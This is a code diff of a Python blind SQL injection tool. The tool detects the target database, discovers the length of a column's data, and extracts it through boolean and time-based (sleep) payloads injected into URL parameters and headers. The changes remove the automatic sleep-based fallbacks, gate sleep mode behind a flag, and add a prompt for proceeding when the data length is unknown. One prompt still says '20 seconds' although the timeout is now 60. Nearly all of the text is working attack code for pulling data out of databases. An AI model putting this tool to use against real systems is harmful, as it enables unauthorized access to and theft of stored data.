@@ -136,47 +136,10 @@ def detect_database(url, request_template=None, injectable_headers={}, static_he
         db_query = info["version_query"]
         sleep_query = info.get("sleep_function", None)
 
-        # Override
-        if args.sleep_only:
-            print(f"[*] Sleep-only mode enabled. Trying sleep-based detection for {db_name}...")
-            detected_db, substring_function = detection(
-                url=url,
-                db_name=db_name,
-                query=db_query,
-                sleep_query=sleep_query,
-                request_template=request_template,
-                injectable_headers=injectable_headers,
-                static_headers=static_headers,
-                detection=detection,
-                args=args
-            )
-        else:
-            detected_db, substring_function = detection(
-                url=url,
-                db_name=db_name,
-                query=db_query,
-                sleep_query=sleep_query,
-                request_template=request_template,
-                injectable_headers=injectable_headers,
-                static_headers=static_headers,
-                detection=detection,
-                args=args
-            )
-
-        if detected_db:
-            return detected_db, substring_function
-
-    # Fallback
-    print(f"[*] Regular detection failed. Attempting sleep-based detection...")
-    for db_name, info in version_queries.items():
-        sleep_query = info.get("sleep_function", None)
-        if not sleep_query or sleep_query == "N/A":
-            continue
-
         detected_db, substring_function = detection(
             url=url,
             db_name=db_name,
-            query=None,
+            query=db_query,
             sleep_query=sleep_query,
             request_template=request_template,
             injectable_headers=injectable_headers,
@@ -290,38 +253,6 @@ def discover_length(url, table, column, where_clause, db_name, detection="status
             print(f"[-] Error during length discovery: {e}")
             return None
 
-    # Fallback
-    if sleep_function and sleep_function != "N/A":
-        print(f"[*] Fallback: Attempting sleep-based detection for length discovery...")
-        for length in range(1, max_length + 1):
-            payload = f"' AND {sleep_function} AND {length_function}((SELECT {column} FROM {table} WHERE {where_clause})) = {length}"
-            encoded_payload = quote(payload)
-
-            try:
-                response, response_time = injection(
-                    url=url,
-                    encoded_payload=encoded_payload,
-                    request_template=request_template,
-                    injectable_headers=injectable_headers,
-                    static_headers=static_headers,
-                    args=args
-                )
-
-                if not response:
-                    return None
-
-                if response_time > 5:
-                    print(f"[+] Sleep-based data length discovered: {length}")
-                    return length
-
-                if args.verbose and args.delay > 0:
-                    print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
-                    time.sleep(args.delay)
-
-            except requests.exceptions.RequestException as e:
-                print(f"[-] Error during sleep-based length discovery: {e}")
-                return None
-
     print(f"[-] Failed to discover data length within the maximum length {max_length}.")
     return None
 
@@ -374,7 +305,7 @@ def extract_data(url, table, column, where_clause, string_function, position, db
                     url, table, column, where_clause, string_function, position, chr(mid),
                     request_template, injectable_headers, static_headers,
                     extraction, baseline_status_code, baseline_content_length,
-                    db_name=db_name, sleep_mode=False, encoded_payload=encoded_payload, args=args
+                    db_name=db_name, encoded_payload=encoded_payload, args=args
                 )
 
                 if result:
@@ -382,7 +313,7 @@ def extract_data(url, table, column, where_clause, string_function, position, db
                 else:
                     high = mid - 1
 
-            if 32 <= low <= 126:  # Ensure valid ASCII range
+            if 32 <= low <= 126:
                 extracted_data += chr(low)
                 print(f"Value found: {chr(low)} at position {position}")
                 found_match = True
@@ -406,21 +337,12 @@ def extract_data(url, table, column, where_clause, string_function, position, db
             if wordlist and len(value) > (data_length - position + 1):
                 continue
 
-            # Sleep Override
-            if args.sleep_only:
-                result = extract_value(
-                    url, table, column, where_clause, string_function, position, value, 
-                    request_template, injectable_headers, static_headers, 
-                    extraction, baseline_status_code, baseline_content_length, 
-                    db_name=db_name, sleep_mode=True, args=args
-                )
-            else:
-                result = extract_value(
-                    url, table, column, where_clause, string_function, position, value, 
-                    request_template, injectable_headers, static_headers, 
-                    extraction, baseline_status_code, baseline_content_length, 
-                    db_name=db_name, sleep_mode=False, args=args
-                )
+            result = extract_value(
+                url, table, column, where_clause, string_function, position, value, 
+                request_template, injectable_headers, static_headers, 
+                extraction, baseline_status_code, baseline_content_length, 
+                db_name=db_name, args=args
+            )
 
             if result:
                 extracted_data += result
@@ -428,34 +350,6 @@ def extract_data(url, table, column, where_clause, string_function, position, db
                 position += len(result)
                 found_match = True
                 break
-
-        # Fallback
-        if not found_match:
-            print("[*] Fallback: Attempting sleep-based extraction...")
-            for value in wordlist if wordlist and not fallback_to_char else CHARSET:
-                if wordlist and len(value) > (data_length - position + 1):
-                    continue
-                result = extract_value(
-                    url, table, column, where_clause, string_function, position, value, 
-                    request_template, injectable_headers, static_headers, 
-                    extraction, baseline_status_code, baseline_content_length, 
-                    db_name=db_name, sleep_mode=True, args=args
-                )
-
-                if result:
-                    extracted_data += result
-                    position += len(result) if wordlist else 1
-                    found_match = True
-                    break
-
-            if not found_match:
-                print(f"[*] No match found at position {position}. Stopping extraction.")
-                position += 1
-                break
-
-        if not found_match and position > data_length:
-            print(f"Data extraction complete")
-            break
 
     return extracted_data
 
@@ -466,8 +360,7 @@ def one_third():
     print("\n[*] A third or less of the data remains to be extracted.")
     print("[*] Would you like to fallback to character-by-character extraction? (y/n): ", end='', flush=True)
     
-    # Wait for user input for 20 seconds, otherwise fallback automatically
-    i, _, _ = select.select([sys.stdin], [], [], 20)
+    i, _, _ = select.select([sys.stdin], [], [], 60)
     
     if i:
         user_input = sys.stdin.readline().strip().lower()
@@ -477,6 +370,22 @@ def one_third():
             return False
     else:
         print("\n[*] No input received. Fallback to character extraction will proceed automatically.")
+        return True
+
+def no_length():
+
+    print("[-] Unable to determine data length. Do you want to proceed with extraction without data length? (y/n): ", end='', flush=True)
+
+    i, _, _ = select.select([sys.stdin], [], [], 60)
+
+    if i:
+        user_input = sys.stdin.readline().strip().lower()
+        if user_input == 'y':
+            return True
+        elif user_input == 'n':
+            return False
+    else:
+        print("\n[*] No input received within 20 seconds. Proceeding with extraction anyway.")
         return True
 
 def load_request(file_path):
@@ -598,7 +507,6 @@ def injection(url, encoded_payload, request_template, injectable_headers, static
             print(f"[VERBOSE] Sent request with payload: {encoded_payload}")
             print(f"[VERBOSE] Response status: {response.status_code}, length: {len(response.text)}")
             print(f"[VERBOSE] Request time: {response_time} seconds")
-            print(f"[VERBOSE] Response Headers: {response.headers}")
 
         return response, response_time
         
@@ -700,14 +608,14 @@ def detection(url, db_name, query, sleep_query, request_template=None, injectabl
 
     return None, None
 
-def extract_value(url, table, column, where_clause, string_function, position, value, request_template, injectable_headers, static_headers, extraction, baseline_status_code, baseline_content_length, db_name=None, sleep_mode=False, encoded_payload=None, args=None):
+def extract_value(url, table, column, where_clause, string_function, position, value, request_template, injectable_headers, static_headers, extraction, baseline_status_code, baseline_content_length, db_name=None, encoded_payload=None, args=None):
 
     if not encoded_payload:
         value_length = len(value)
         payload = f"' AND {string_function}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {value_length}) = '{value}'"
         encoded_payload = quote(payload)
 
-    if sleep_mode and db_name:
+    if args.sleep_only and db_name:
         sleep_function = version_queries[db_name].get("sleep_function", None)
         if not sleep_function or sleep_function == "N/A":
             print(f"[-] Sleep function not applicable or not found for {db_name}. Skipping...")
@@ -722,7 +630,7 @@ def extract_value(url, table, column, where_clause, string_function, position, v
 
     try:
         if args.verbose:
-            print(f"[VERBOSE] Querying Database: {db_name if sleep_mode else 'Regular'} with payload: {encoded_payload}")
+            print(f"[VERBOSE] Querying Database: {db_name if args.sleep_only else 'Regular'} with payload: {encoded_payload}")
 
         response, response_time = injection(
             url=url,
@@ -741,7 +649,7 @@ def extract_value(url, table, column, where_clause, string_function, position, v
                 print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
             time.sleep(args.delay)
 
-        if sleep_mode:
+        if args.sleep_only:
             if response_time > 5:
                 print(f"[+] Sleep-based match found: {value} at position {position}")
                 return value
@@ -760,7 +668,7 @@ def extract_value(url, table, column, where_clause, string_function, position, v
                     return value
 
     except requests.exceptions.RequestException as e:
-        print(f"[-] Error during {'sleep-based ' if sleep_mode else ''}extraction for {value}: {e}")
+        print(f"[-] Error during {'sleep-based ' if args.sleep_only else ''}extraction for {value}: {e}")
         return None
 
     return None
@@ -836,8 +744,6 @@ def main():
         return
 
     # Step 3: Discover length of data
-    extracted_data = ""
-
     data_length = discover_length(
         url=args.url,
         table=args.table,
@@ -855,7 +761,12 @@ def main():
     if data_length:
         print(f"[+] Data length to extract: {data_length}")
     else:
-        print("[-] Unable to determine data length. Proceeding with extraction anyway.")
+        if no_length():
+            data_length = args.max_length
+            print(f"[!] Data length not discovered. Defaulting to max length: {data_length} (can be adjusted with --max-length)")
+        else:
+            print("[-] User chose not to proceed with extraction.")
+            return
 
     # Step 4: Extract the data
     extracted_data = extract_data(
